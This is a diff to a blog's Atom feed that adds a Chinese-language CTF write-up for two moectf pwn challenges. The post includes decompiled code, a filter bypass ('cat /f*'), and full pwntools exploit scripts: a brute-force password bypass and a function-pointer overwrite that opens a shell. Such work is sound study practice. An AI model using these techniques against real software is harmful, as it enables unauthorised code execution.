@@ -5,8 +5,276 @@
   <link href="https://dxfaker.top/" rel="alternate" type="text/html"/>
   <link href="https://dxfaker.top/atom.xml" rel="self" type="application/atom+xml"/>
   <id>https://dxfaker.top/</id>
-  <updated>2026-09-08T14:49:34.508Z</updated>
+  <updated>2026-09-09T14:12:25.994Z</updated>
   <language>en</language>
+  <entry>
+    <title>2026moectf第一周wp</title>
+    <link href="https://dxfaker.top/posts/26moe2/" rel="alternate" type="text/html"/>
+    <id>https://dxfaker.top/posts/26moe2/</id>
+    <published>2026-09-09T00:00:00.000Z</published>
+    <updated>2026-09-09T00:00:00.000Z</updated>
+    <summary>你怎么知道我又来拉屎了</summary>
+    <content type="html"><![CDATA[<h1>onlyshell</h1>
+<p>checksec</p>
+<pre><code> Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+</code></pre>
+<p>说明是随机地址</p>
+<p>再看main逻辑</p>
+<pre><code>__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  int v3; // eax
+  __int64 v4; // rax
+  int v6; // [rsp+4h] [rbp-144h] BYREF
+  char s2[4]; // [rsp+Bh] [rbp-13Dh] BYREF
+  char v8; // [rsp+Fh] [rbp-139h]
+  char s1[4]; // [rsp+10h] [rbp-138h] BYREF
+  char v10; // [rsp+14h] [rbp-134h]
+  unsigned __int64 v11; // [rsp+118h] [rbp-30h]
+
+  v11 = __readfsqword(0x28u);
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  alarm(0x78u);
+  v8 = 0;
+  *(_DWORD *)s2 = arc4random();                 // 造了一个随机数
+  v6 = 0;
+  *(_DWORD *)s1 = 0;
+  v10 = 0;
+  __printf_chk(2, "password: ");
+  if ( (unsigned int)__isoc23_scanf("%u", &amp;v6) != 1 )// 强制要求用户输入一个有效的无符号整数
+LABEL_14:
+    exit(0);
+  do
+    v3 = getc(stdin);
+  while ( v3 != -1 &amp;&amp; v3 != 10 );
+  *(_DWORD *)s1 = v6;
+  if ( strcmp(s1, s2) )
+  {
+    puts("wrong");
+    goto LABEL_14;
+  }
+  puts("only shell builtins here.");
+  while ( 1 )
+  {
+    __printf_chk(2, "$ ");
+    if ( !fgets(s1, 256, stdin) )
+      break;
+    s1[strcspn(s1, "\n")] = 0;                  // 计算字符串中从起始位置开始连续不包含指定字符集合的子串长度。
+    if ( s1[0] )
+    {
+      if ( strpbrk(s1, "`\\(){}") )             // 检索
+      {
+        puts("bad char");
+      }
+      else if ( strstr(s1, "flag") )
+      {
+        puts("bad word");
+      }
+      else
+      {
+        LODWORD(v4) = fork();
+        if ( !(_DWORD)v4 )
+        {
+          execl("/bin/bash", "bash", "--noprofile", "--norc", "-c", s1, 0, v4);
+          _exit(1);
+        }
+        wait(0);
+      }
+    }
+  }
+  return 0;
+}
+</code></pre>
+<blockquote>
+<p>程序将 <code>arc4random()</code> 的 4 字节写入 <code>char s[4]</code>，然后与用户输入的字符串 <code>strcmp</code> 比较。若用户输入 <code>"0"</code>（即字符串首字节 <code>'\0'</code>），当随机数的第一个字节恰好为 0 时，两个空字符串相等，验证通过。概率为 1/256，可通过多次连接暴力尝试。</p>
+</blockquote>
+<p>可以看出我们需要暴力枚举到随机数爆0来度过第一轮检查，然后还要经过badword筛查才能拿到flag</p>
+<p>那我用</p>
+<pre><code>cat /f*
+</code></pre>
+<p>我的exp</p>
+<pre><code>from pwn import *
+import time
+context.log_level = 'error'
+
+def try_once():
+    try:
+        p = process('./pwn')
+        p.recvuntil(b'password: ')
+        p.sendline(b'0')
+        resp = p.recvline(timeout=3)
+        if b'wrong' in resp or b'incorrect' in resp:
+            p.close()
+            return None
+        else:
+            return p
+    except:
+        return None
+
+for i in range(1, 1001):
+    p = try_once()
+    if p:
+        p.sendline(b'cat /f*')
+        try:
+            out = p.recvall(timeout=3).decode(errors='ignore')
+            print(out)
+        except:
+            pass
+        p.close()
+        break
+else:
+    print('失败')
+
+</code></pre>
+<h1>littlebee</h1>
+<p>checksec</p>
+<pre><code>    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+   
+</code></pre>
+<p>看main函数逻辑</p>
+<pre><code>int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 index; // rax
+  void (*v5)(void); // [rsp+0h] [rbp-50h] BYREF
+  _QWORD v6[8]; // [rsp+8h] [rbp-48h]
+  __int64 v7; // [rsp+48h] [rbp-8h]
+
+  v5 = (void (*)(void))ordinary_bell;
+  v6[0] = 7312845;
+  v6[1] = 7312846;
+  v6[2] = 7312847;
+  v6[3] = 7312848;
+  v6[4] = 7312849;
+  v6[5] = 7312850;
+  v6[6] = 7312851;
+  v6[7] = 7312852;
+  initialise(argc, argv, envp);
+  while ( 1 )
+  {
+    show_menu();
+    index = read_index();
+    if ( index == 4 )
+      return 0;
+    if ( index &gt; 4 )
+      goto LABEL_14;
+    switch ( index )
+    {
+      case 3LL:
+        v5();
+        break;
+      case 1LL:
+        show_records(&amp;v5);
+        break;
+      case 2LL:
+        printf("Which shelf slot should be updated? ");// 哪个货架插槽应该更新？
+        v7 = read_index();
+        if ( v7 &lt;= 7 )
+        {
+          printf("What pickup code should be written there? ");// 那里应该写什么收货代码？
+          v6[v7] = read_pickup_code();
+          puts("The clerk writes it down.");    // 店员把它写下来。
+        }
+        else
+        {
+          puts("That slot is not on the shelf map.");// 那个位置不在货架地图上。
+        }
+        break;
+      default:
+LABEL_14:
+        puts("The desk does not understand that request.");// 桌子不明白这个要求。
+        break;
+    }
+  }
+}
+</code></pre>
+<p>注意看栈分布，rbp-8到rbp-48为v6，rbp-50为*v5(指针)，且v6[v7] = read_pickup_code();</p>
+<p>shift+F12看到有一个bin不过是.rodata上的，按X查看另外一个调用</p>
+<pre><code>int staff_room()
+{
+  char *argv[2]; // [rsp+0h] [rbp-10h] BYREF
+
+  argv[0] = "/bin/sh";
+  argv[1] = 0;
+  return execve("/bin/sh", argv, 0);
+}
+</code></pre>
+<p>也就是后门</p>
+<p>现在来看功能</p>
+<ol>
+<li>
+<p>打印v5地址(PIE的问题解决了)</p>
+</li>
+<li>
+<p>选择一个数组成员改变他的值</p>
+</li>
+<li>
+<p>执行v5</p>
+</li>
+<li>
+<p>退出</p>
+</li>
+</ol>
+<p>而且功能二并没有限制v7往前面写(rbp-48到rbp-50正好是2*4=8)</p>
+<p>所以说让指针指向后门函数他会直接执行后门函数</p>
+<p>ok，下面是攻击思路</p>
+<p>一次是输入1让他打印地址，然后再利用算好的地址输入2再改变v6[-1]来改变他的值，最后在执行3就可以跑到后门函数</p>
+<p>exp</p>
+<pre><code>from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+# p = remote('127.0.0.1', 57430)
+p = process('./little-bee')
+
+ORDINARY_BELL = 0x138E
+STAFF_ROOM    = 0x13A8
+
+menu = p.recv(timeout=1)
+log.info(f'menu: {menu!r}')
+
+p.sendline(b'1')
+line = p.recvline()         
+leak = int(line.split(b': ')[1].strip(), 16)
+log.info(f'ordinary_bell = {hex(leak)}')
+
+staff_room = leak - ORDINARY_BELL + STAFF_ROOM
+log.info(f'staff_room   = {hex(staff_room)}')
+
+def update(idx, code):
+    p.sendline(b'2')
+    p.recvuntil(b'updated? ')                       
+    p.sendline(str(idx).encode())                      
+    p.recvuntil(b'there? ')                            
+    p.sendline(hex(code).encode())               
+
+update(-1, staff_room)
+p.sendline(b'3')
+
+p.interactive()
+
+</code></pre>
+<p>你得考虑这个问题，我10点才写完这俩题的WP,12点又鸡巴要断电，所以大三题我决定明天再更</p>
+]]></content>
+    <author>
+      <name></name>
+    </author>
+    <category term="wp"></category>
+  </entry>
   <entry>
     <title>2026第一周WP</title>
     <link href="https://dxfaker.top/posts/26moe1/" rel="alternate" type="text/html"/>
